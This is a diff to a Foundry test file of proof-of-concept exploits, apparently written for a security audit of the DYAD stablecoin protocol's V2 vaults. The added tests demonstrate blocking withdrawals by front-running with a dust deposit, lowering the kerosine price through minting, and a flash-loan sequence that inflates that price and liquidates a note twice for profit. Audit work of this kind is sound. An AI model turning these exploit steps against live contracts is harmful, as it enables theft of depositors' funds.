@@ -92,6 +92,10 @@ abstract contract V2Start is Test, Parameters, IERC721Receiver {
     return (1e18 * (ethToUsd(depositedEth()) + wstEthToUsd(depositedWstEth()))) / dyadToUsd(mintedDyad());
   }
 
+  function exogenousBorrowingPowerDyad(uint ethAmount, uint wstEthAmount) public view returns (uint) {
+    return 1e18 * (ethToUsd(ethAmount) * 1e10 + wstEthToUsd(wstEthAmount) * 1e10) / 1.5e18; // * 1e10 converts from USD to DYAD
+  }
+
   function displayDecimals(uint amount, uint decimals) public pure returns (string memory) {
     string memory integer = Strings.toString(amount / 10**decimals);
     string memory fractional = Strings.toString(amount % 10**decimals);
@@ -118,6 +122,7 @@ abstract contract V2Start is Test, Parameters, IERC721Receiver {
     console2.log("Kerosine Price:          %s", displayDecimals(kerosineToUsd(1 ether), 8));
     console2.log("Global CR:               %s", displayDecimals(globalCollateralization(), 18));
     console2.log("------------------------");
+    console2.log("");
   }
 
   function displayMetrics(uint id_) public view {
@@ -137,6 +142,7 @@ abstract contract V2Start is Test, Parameters, IERC721Receiver {
     console2.log("V2 minted Dyad(USD):     %s", displayDecimals(dyadToUsd(_mintedDyad), 8));
     console2.log("Collateralization Ratio: %s", displayDecimals(contracts.vaultManager.collatRatio(id_), 18));
     console2.log("------------------------");
+    console2.log("");
   }
 
   Contracts contracts;
@@ -176,6 +182,75 @@ contract PoCs is V2Start {
     contracts.vaultManager.addKerosene(id, address(contracts.unboundedKerosineVault));
   }
 
+  function testMintRevertsDueToLicensing() public {
+    // We license the vault manager to be able to mint DYAD
+    vm.prank(MAINNET_OWNER);
+    Licenser(contracts.vaultLicenser).add(address(contracts.vaultManager));
+
+    DNft dNft = DNft(MAINNET_DNFT);
+    
+    // We reset the DNft contract to be able to mint free DNfts
+    vm.etch(address(MAINNET_DNFT), address(new DNft()).code);
+    dNft = DNft(MAINNET_DNFT);
+
+    uint id = dNft.mintNft(address(this));
+
+    // Obtain weth
+    vm.prank(MAINNET_WETH); // deal not working for me
+    ERC20(MAINNET_WETH).transfer(address(this), 1 ether);
+
+    // Add the weth vault and deposit 1 eth    
+    contracts.vaultManager.add(id, address(contracts.ethVault));
+    ERC20(MAINNET_WETH).approve(address(contracts.vaultManager), 1 ether);
+    contracts.vaultManager.deposit(id, address(contracts.ethVault), 1 ether);
+
+    // Mint dyad, and watch it revert
+    contracts.vaultManager.mintDyad(id, 1 ether, address(this));
+  }
+
+  function testFrontrunWithdrawals_Debug() public {
+    // We license the vault manager to be able to mint DYAD
+    vm.prank(MAINNET_OWNER);
+    Licenser(contracts.vaultLicenser).add(address(contracts.vaultManager));
+
+    DNft dNft = DNft(MAINNET_DNFT);
+    
+    // Add the vault manager to the OLD licenser to allow minting DYAD
+    vm.prank(MAINNET_OWNER);
+    Licenser(0xd8bA5e720Ddc7ccD24528b9BA3784708528d0B85).add(address(contracts.vaultManager));
+
+    // We reset the DNft contract to be able to mint free DNfts
+    vm.etch(address(MAINNET_DNFT), address(new DNft()).code);
+    dNft = DNft(MAINNET_DNFT);
+
+    uint id = dNft.mintNft(address(this));
+
+    // Obtain weth
+    vm.prank(MAINNET_WETH); // deal not working for me
+    ERC20(MAINNET_WETH).transfer(address(this), 1 ether);
+
+    // Add the weth vault and deposit 1 eth    
+    contracts.vaultManager.add(id, address(contracts.ethVault));
+    ERC20(MAINNET_WETH).approve(address(contracts.vaultManager), 1 ether);
+    contracts.vaultManager.deposit(id, address(contracts.ethVault), 1 ether);
+
+    // Move to the next block to pass the flash loan protection
+    vm.roll(block.number + 1);
+
+    // Now we want to withdraw, but we are stopped from doing so
+    address badguy = address(0xBAD);
+    vm.prank(MAINNET_WETH);
+    ERC20(MAINNET_WETH).transfer(badguy, 1);
+
+    vm.startPrank(badguy);
+    ERC20(MAINNET_WETH).approve(address(contracts.vaultManager), 1);
+    contracts.vaultManager.deposit(id, address(contracts.ethVault), 1);
+    vm.stopPrank();
+
+    // We can't withdraw
+    contracts.vaultManager.withdraw(id, address(contracts.ethVault), 1 ether, address(this));
+  }
+
   function testMintWithKerosineReverts() public {
     // We license the vault manager to be able to mint DYAD
     vm.prank(MAINNET_OWNER);
@@ -198,9 +273,6 @@ contract PoCs is V2Start {
     ERC20(MAINNET_WETH).approve(address(contracts.vaultManager), 1 ether);
     contracts.vaultManager.deposit(id, address(contracts.ethVault), 1 ether);
 
-    // Move to the next block to pass the flash loan protection
-    vm.roll(block.number + 1);
-
     // Obtain kerosene
     vm.prank(MAINNET_OWNER);
     ERC20(MAINNET_KEROSENE).transfer(address(this), 100_000_000 ether); // This is a huge amount because the surplus collateral is low and the unitary price of kerosine is also low.
@@ -218,6 +290,10 @@ contract PoCs is V2Start {
     // We license the vault manager to be able to mint DYAD
     vm.prank(MAINNET_OWNER);
     Licenser(contracts.vaultLicenser).add(address(contracts.vaultManager));
+
+    // Add the vault manager to the OLD licenser to allow minting DYAD
+    vm.prank(MAINNET_OWNER);
+    Licenser(0xd8bA5e720Ddc7ccD24528b9BA3784708528d0B85).add(address(contracts.vaultManager));
 
     DNft dNft = DNft(MAINNET_DNFT);
     
@@ -245,7 +321,7 @@ contract PoCs is V2Start {
     vm.prank(MAINNET_WETH); // deal not working for me
     ERC20(MAINNET_WETH).transfer(address(this), 1 ether);
 
-    // Add the weth vault and deposit 1 eth    
+    // Add the weth vault and deposit 1 eth to note 1 to give value to kerosine
     contracts.vaultManager.add(id1, address(contracts.ethVault));
     ERC20(MAINNET_WETH).approve(address(contracts.vaultManager), 1 ether);
     contracts.vaultManager.deposit(id1, address(contracts.ethVault), 1 ether);
@@ -254,12 +330,12 @@ contract PoCs is V2Start {
     vm.prank(MAINNET_OWNER);
     ERC20(MAINNET_KEROSENE).transfer(address(this), 100_000_000 ether); // This is a huge amount because the surplus collateral is low and the unitary price of kerosine is also low.
 
-    // Add the kerosene vault and deposit 1 kerosene
+    // Add the kerosene vault and deposit 1 kerosine to note 2
     contracts.vaultManager.add(id2, address(contracts.unboundedKerosineVault));
     ERC20(MAINNET_KEROSENE).approve(address(contracts.vaultManager), 100_000_000 ether);
     contracts.vaultManager.deposit(id2, address(contracts.unboundedKerosineVault), 100_000_000 ether);
 
-    // Mint dyad
+    // Mint dyad from note 2 using only kerosine
     contracts.vaultManager.mintDyad(id2, 1 ether, address(this));
 
     // Success!
@@ -273,7 +349,6 @@ contract PoCs is V2Start {
 
     DNft dNft = DNft(MAINNET_DNFT);
     
-
     // Add the vault manager to the OLD licenser to allow minting DYAD
     vm.prank(MAINNET_OWNER);
     Licenser(0xd8bA5e720Ddc7ccD24528b9BA3784708528d0B85).add(address(contracts.vaultManager));
@@ -339,11 +414,220 @@ contract PoCs is V2Start {
     contracts.vaultLicenser.remove(address(contracts.wstEth));
     vm.stopPrank();
 
+    console2.log("Metrics before liquidation");
+    displayMetrics(id);
+
     // Liquidate
     contracts.vaultManager.liquidate(id, to);
 
+    console2.log("Metrics before liquidation");
+    displayMetrics(id);
+
     // We still have the kerosine in the vault
     assertGt(contracts.unboundedKerosineVault.id2asset(id), 0);
+  }
+
+  function testMintLowersKerosinePrice() public {
+    // We license the vault manager to be able to mint DYAD
+    vm.prank(MAINNET_OWNER);
+    Licenser(contracts.vaultLicenser).add(address(contracts.vaultManager));
+
+    // Add the vault manager to the OLD licenser to allow minting DYAD
+    vm.prank(MAINNET_OWNER);
+    Licenser(0xd8bA5e720Ddc7ccD24528b9BA3784708528d0B85).add(address(contracts.vaultManager));
+
+    DNft dNft = DNft(MAINNET_DNFT);
+    
+    // We reset the DNft contract to be able to mint free DNfts
+    vm.etch(address(MAINNET_DNFT), address(new DNft()).code);
+    dNft = DNft(MAINNET_DNFT);
+
+    // We patch the Unbounded Kerosine Vault so that it doesn't count the v1 DYAD
+    vm.etch(
+      address(contracts.unboundedKerosineVault),
+      address(
+        new UnboundedKerosineVaultFixed(
+          contracts.vaultManager,
+          Kerosine(MAINNET_KEROSENE), 
+          Dyad    (MAINNET_DYAD),
+          contracts.kerosineManager
+        )
+      ).code
+    );
+
+    uint id = dNft.mintNft(address(this));
+
+    // Obtain weth
+    vm.prank(MAINNET_WETH); // deal not working for me
+    ERC20(MAINNET_WETH).transfer(address(this), 1 ether);
+
+    // Add the weth vault and deposit 1 eth    
+    contracts.vaultManager.add(id, address(contracts.ethVault));
+    ERC20(MAINNET_WETH).approve(address(contracts.vaultManager), 1 ether);
+    contracts.vaultManager.deposit(id, address(contracts.ethVault), 1 ether);
+
+    // Measure kerosine price at rest
+    uint kerosinePriceBefore = contracts.unboundedKerosineVault.assetPrice();
+    console2.log("Kerosine price at rest: %s", displayDecimals(kerosinePriceBefore, 18));
+
+    // Mint dyad
+    contracts.vaultManager.mintDyad(id, 1000 ether, address(this));
+
+    // Lowered kerosine price
+    uint kerosinePriceAfter = contracts.unboundedKerosineVault.assetPrice();
+    console2.log("Kerosine price after mint: %s", displayDecimals(kerosinePriceAfter, 18));
+
+    // Success!
+    assertLt(kerosinePriceAfter, kerosinePriceBefore);
+  }
+
+  function testUseFlashLoansToPumpKerosinePrice() public {
+    // We license the vault manager to be able to mint DYAD
+    vm.prank(MAINNET_OWNER);
+    Licenser(contracts.vaultLicenser).add(address(contracts.vaultManager));
+
+    DNft dNft = DNft(MAINNET_DNFT);
+    
+    // Add the vault manager to the OLD licenser to allow minting DYAD
+    vm.prank(MAINNET_OWNER);
+    Licenser(0xd8bA5e720Ddc7ccD24528b9BA3784708528d0B85).add(address(contracts.vaultManager));
+
+    // We reset the DNft contract to be able to mint free DNfts
+    vm.etch(address(MAINNET_DNFT), address(new DNft()).code);
+    dNft = DNft(MAINNET_DNFT);
+
+    uint id1 = dNft.mintNft(address(this));
+    uint id2 = dNft.mintNft(address(this));
+    uint id3 = dNft.mintNft(address(this));
+
+    // We patch the Unbounded Kerosine Vault so that it doesn't count the v1 DYAD
+    vm.etch(
+      address(contracts.unboundedKerosineVault),
+      address(
+        new UnboundedKerosineVaultFixed(
+          contracts.vaultManager,
+          Kerosine(MAINNET_KEROSENE), 
+          Dyad    (MAINNET_DYAD),
+          contracts.kerosineManager
+        )
+      ).code
+    );
+
+    // We patch the VaultManager so that it uses the Licenser to decide on adding kerosene vaults to DNfts
+    vm.etch(
+      address(contracts.vaultManager),
+      address(
+        new VaultManagerV2Fixed(
+        DNft(MAINNET_DNFT),
+        Dyad(MAINNET_DYAD),
+        contracts.vaultLicenser
+      )
+      ).code
+    );
+
+    // Get some weth. This would be own funds.
+    vm.prank(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
+    ERC20(MAINNET_WETH).transfer(address(this), 10 ether);
+
+    // Add the weth vault to note 1 and deposit 10 eth    
+    contracts.vaultManager.add(id1, address(contracts.ethVault));
+    ERC20(MAINNET_WETH).approve(address(contracts.vaultManager), 10 ether);
+    contracts.vaultManager.deposit(id1, address(contracts.ethVault), 10 ether);
+
+    // Record the normal kerosine price
+    console2.log("Normal Kerosine Price: %s", contracts.unboundedKerosineVault.assetPrice());
+
+    // Obtain weth from Morpho, we would return this later. Easy to code flash loan equivalent.
+    vm.prank(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
+    ERC20(MAINNET_WETH).transfer(address(this), 1000 ether);
+    console2.log("WETH obtained as a flash loan: %s", displayDecimals(ERC20(MAINNET_WETH).balanceOf(address(this)), 18));
+
+    // Add the weth vault to note 2 and deposit the flash loaned weth    
+    contracts.vaultManager.add(id2, address(contracts.ethVault));
+    ERC20(MAINNET_WETH).approve(address(contracts.vaultManager), 1000 ether);
+    contracts.vaultManager.deposit(id2, address(contracts.ethVault), 1000 ether);
+
+    uint id2loan = exogenousBorrowingPowerDyad(1000 ether, 0);
+    contracts.vaultManager.mintDyad(id2, id2loan, address(this));
+
+    console2.log("Metrics id2 before id1 borrows");
+    displayMetrics(id2);
+    console2.log("Maximum Kerosine Price: %s", contracts.unboundedKerosineVault.assetPrice());
+
+    // Obtain kerosene, we would buy this from a DEX.
+    vm.prank(MAINNET_OWNER);
+    ERC20(MAINNET_KEROSENE).transfer(address(this), 100_000 ether);
+
+    // Add the kerosene vault to note 2 and deposit kerosene
+    contracts.vaultManager.addKerosene(id2, address(contracts.unboundedKerosineVault));
+    ERC20(MAINNET_KEROSENE).approve(address(contracts.vaultManager), 100_000 ether);
+    contracts.vaultManager.deposit(id2, address(contracts.unboundedKerosineVault), 100_000 ether);
+
+    console2.log("Metrics id2 after depositing kerosine");
+    displayMetrics(id2);
+
+    // Mint dyad from note 2 to the max again
+    uint kerosinePower = 1e18 * (kerosineToUsd(100_000 ether) * 1e10) / 1.5e18 - 1 ether;
+    console2.log("Kerosine power: %s", displayDecimals(kerosinePower, 18));
+    contracts.vaultManager.mintDyad(id2, kerosinePower, address(this));
+
+    console2.log("Metrics id2 after kerosine borrow");
+    displayMetrics(id2);
+
+    // Mint dyad from note 1 to the max to get note 2 underwater
+    uint id1loan = exogenousBorrowingPowerDyad(10 ether, 0);
+    console2.log("id1loan: %s", id1loan);
+    contracts.vaultManager.mintDyad(id1, id1loan, address(this));
+
+    console2.log("Metrics id2 after id1 borrows");
+    displayMetrics(id2);
+
+    // Liquidate note 2
+    contracts.vaultManager.liquidate(id2, id3);
+
+    console2.log("Metrics id2 after first liquidation");
+    displayMetrics(id2);
+
+    // Repay note 1
+    contracts.vaultManager.burnDyad(id1, id1loan);
+
+    // Mint dyad from note 2 to the max again
+    uint remainingEth = contracts.ethVault.id2asset(id2);
+    id2loan = exogenousBorrowingPowerDyad(remainingEth, 0);
+    contracts.vaultManager.mintDyad(id2, id2loan, address(this));
+
+    console2.log("Metrics id2 after second dyad borrow");
+    displayMetrics(id2);
+
+    kerosinePower = 1e18 * (kerosineToUsd(100_000 ether) * 1e10) / 1.5e18 - 1 ether;
+    console2.log("Kerosine power: %s", displayDecimals(kerosinePower, 18));
+    contracts.vaultManager.mintDyad(id2, kerosinePower, address(this));
+
+    console2.log("Metrics id2 after second kerosine borrow");
+    displayMetrics(id2);
+
+    // Mint dyad from note 1 to the max to get note 2 underwater
+    id1loan = exogenousBorrowingPowerDyad(10 ether, 0);
+    console2.log("id1loan: %s", id1loan);
+    contracts.vaultManager.mintDyad(id1, id1loan, address(this));
+
+    console2.log("Metrics id2 after id1 borrows");
+    displayMetrics(id2);
+
+    // Liquidate note 2 again
+    contracts.vaultManager.liquidate(id2, id3);
+
+    console2.log("Metrics id2 after second liquidation");
+    displayMetrics(id2);
+
+    console2.log("Metrics id3 after second liquidation");
+    displayMetrics(id3);
+
+    // Withdraw the weth from note 3
+    contracts.vaultManager.add(id3, address(contracts.ethVault));
+    contracts.vaultManager.withdraw(id3, address(contracts.ethVault), contracts.ethVault.id2asset(id3), address(this));
+    console2.log("WETH recovered after two rounds: %s", displayDecimals(ERC20(MAINNET_WETH).balanceOf(address(this)), 18));
+    //assertGt(contracts.unboundedKerosineVault.id2asset(id), 0);
   }
 }
 
